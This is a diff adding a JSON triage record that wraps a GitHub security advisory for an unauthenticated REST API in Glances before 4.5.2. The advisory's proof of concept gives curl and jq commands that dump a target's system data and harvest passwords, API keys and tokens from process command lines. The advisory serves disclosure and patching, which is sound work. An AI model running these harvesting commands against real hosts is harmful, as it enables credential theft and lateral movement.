@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/24750220?v=4\", \"events_url\": \"https://api.github.com/users/DhiyaneshGeek/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/DhiyaneshGeek/followers\", \"following_url\": \"https://api.github.com/users/DhiyaneshGeek/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/DhiyaneshGeek/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/DhiyaneshGeek\", \"id\": 24750220, \"login\": \"DhiyaneshGeek\", \"node_id\": \"MDQ6VXNlcjI0NzUwMjIw\", \"organizations_url\": \"https://api.github.com/users/DhiyaneshGeek/orgs\", \"received_events_url\": \"https://api.github.com/users/DhiyaneshGeek/received_events\", \"repos_url\": \"https://api.github.com/users/DhiyaneshGeek/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/DhiyaneshGeek/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/DhiyaneshGeek/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/DhiyaneshGeek\", \"user_view_type\": \"public\"}}, {\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/259903237?v=4\", \"events_url\": \"https://api.github.com/users/neo-ai-engineer/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/neo-ai-engineer/followers\", \"following_url\": \"https://api.github.com/users/neo-ai-engineer/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/neo-ai-engineer/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/neo-ai-engineer\", \"id\": 259903237, \"login\": \"neo-ai-engineer\", \"node_id\": \"U_kgDOD33PBQ\", \"organizations_url\": \"https://api.github.com/users/neo-ai-engineer/orgs\", \"received_events_url\": \"https://api.github.com/users/neo-ai-engineer/received_events\", \"repos_url\": \"https://api.github.com/users/neo-ai-engineer/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/neo-ai-engineer/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/neo-ai-engineer/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/neo-ai-engineer\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-32596\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-200\", \"name\": \"Exposure of Sensitive Information to an Unauthorized Actor\"}], \"description\": \"### Summary\\nGlances web server runs without authentication by default when started with `glances -w`, exposing REST API with sensitive system information including process command-lines containing credentials (passwords, API keys, tokens) to any network client.\\n\\n### Details\\nRoot Cause: Authentication is optional and disabled by default. When no password is provided, the API router initializes without authentication dependency, and the server binds to 0.0.0.0 exposing all endpoints.\\n\\nAffected Code:\\n- File: `glances/outputs/glances_restful_api.py`, lines 259-272\\n\\n```python\\nif self.args.password:\\n    self._password = GlancesPassword(username=args.username, config=config)\\n    if JWT_AVAILABLE:\\n        jwt_secret = config.get_value('outputs', 'jwt_secret_key', default=None)\\n        jwt_expire = config.get_int_value('outputs', 'jwt_expire_minutes', default=60)\\n        self._jwt_handler = JWTHandler(secret_key=jwt_secret, expire_minutes=jwt_expire)\\n        logger.info(f\\\"JWT authentication enabled (token expiration: {jwt_expire} minutes)\\\")\\n    else:\\n        self._jwt_handler = None\\n        logger.info(\\\"JWT authentication not available (python-jose not installed)\\\")\\nelse:\\n    self._password = None  # NO AUTHENTICATION BY DEFAULT\\n    self._jwt_handler = None\\n```\\n\\n- File: `glances/outputs/glances_restful_api.py`, lines 477-480\\n\\n```python\\nif self.args.password:\\n    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])\\nelse:\\n    router = APIRouter(prefix=self.url_prefix)  # NO AUTH DEPENDENCY\\n```\\n\\n- File: `glances/outputs/glances_restful_api.py`, lines 98-99\\n\\n```python\\nself.bind_address = args.bind_address or \\\"0.0.0.0\\\"  # BINDS TO ALL INTERFACES\\nself.port = args.port or 61208\\n```\\n\\n- File: `glances/plugins/processlist/__init__.py`, lines 127-140\\n\\n```python\\nenable_stats = [\\n    'cpu_percent',\\n    'memory_percent',\\n    'memory_info',\\n    'pid',\\n    'username',\\n    'cpu_times',\\n    'num_threads',\\n    'nice',\\n    'status',\\n    'io_counters',\\n    'cpu_num',\\n    'cmdline',  # FULL COMMAND LINE EXPOSED, NO SANITIZATION\\n]\\n```\\n\\n### PoC\\n\\n1. Start Glances in default web server mode:\\n```bash\\nglances -w\\n# Output: Glances Web User Interface started on http://0.0.0.0:61208/\\n```\\n\\n2. Access API without authentication from any network client:\\n```bash\\ncurl -s http://TARGET:61208/api/4/system | jq .\\n```\\n\\n<img width=\\\"593\\\" height=\\\"265\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/4ec461be-b480-46d5-88e2-f4004f4dae54\\\" />\\n\\n\\n3. Extract system information:\\n```bash\\ncurl -s http://TARGET:61208/api/4/all > system_dump.json\\n```\\n<img width=\\\"688\\\" height=\\\"547\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/7564fb2a-7d94-4c26-848a-03034214b8c7\\\" />\\n\\n4. Harvest credentials from process list:\\n```bash\\ncurl -s http://TARGET:61208/api/4/processlist | \\\\\\n  jq -r '.[] | select(.cmdline | tostring | test(\\\"password|api-key|token|secret\\\"; \\\"i\\\")) | \\n  {pid, username, process: .name, cmdline}'\\n```\\n\\n5. Example credential exposure:\\n```json\\n{\\n  \\\"pid\\\": 4059,\\n  \\\"username\\\": \\\"root\\\",\\n  \\\"process\\\": \\\"python3\\\",\\n  \\\"cmdline\\\": [\\n    \\\"python3\\\",\\n    \\\"-c\\\",\\n    \\\"import time; time.sleep(3600)\\\",\\n    \\\"--api-key=sk-super-secret-token-12345\\\",\\n    \\\"--password=MySecretPassword123\\\",\\n    \\\"--db-pass=admin123\\\"\\n  ]\\n}\\n```\\n\\n### Impact\\n\\nComplete system reconnaissance and credential harvesting from any network client. Exposed endpoints include system info, process lists with full command-line arguments (containing passwords/API keys/tokens), network connections, filesystems, and Docker containers. Enables lateral movement and targeted attacks using stolen credentials.\", \"epss\": {\"percentage\": 0.0155, \"percentile\": 0.71846}, \"ghsa_id\": \"GHSA-wvxv-4j8q-4wjq\", \"github_reviewed_at\": \"2026-03-16T16:23:56Z\", \"html_url\": \"https://github.com/advisories/GHSA-wvxv-4j8q-4wjq\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wvxv-4j8q-4wjq\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-32596\"}], \"nvd_published_at\": \"2026-03-18T06:16:18Z\", \"published_at\": \"2026-03-16T16:23:56Z\", \"references\": [\"https://github.com/nicolargo/glances/security/advisories/GHSA-wvxv-4j8q-4wjq\", \"https://github.com/nicolargo/glances/commit/208d876118fea5758970f33fd7474908bd403d25\", \"https://github.com/nicolargo/glances/releases/tag/v4.5.2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-32596\", \"https://github.com/advisories/GHSA-wvxv-4j8q-4wjq\"], \"repository_advisory_url\": \"https://api.github.com/repos/nicolargo/glances/security-advisories/GHSA-wvxv-4j8q-4wjq\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nicolargo/glances\", \"summary\": \"Glances exposes the REST API without authentication\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-16T05:25:05Z\", \"url\": \"https://api.github.com/advisories/GHSA-wvxv-4j8q-4wjq\", \"vulnerabilities\": [{\"first_patched_version\": \"4.5.2\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"Glances\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 4.5.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wvxv-4j8q-4wjq",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "Glances: < 4.5.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-32596"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "Glances"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.715365Z",
+  "provenance": {
+    "content_sha256": "b7e3e455ce16a96f5713b402f25cb9dbbe2b335dc1f9785dd1594580f91a84d6",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-16T16:23:56Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wvxv-4j8q-4wjq",
+  "status": "active",
+  "title": "Glances exposes the REST API without authentication",
+  "updated_at": "2026-06-16T05:25:05Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wvxv-4j8q-4wjq"
+}
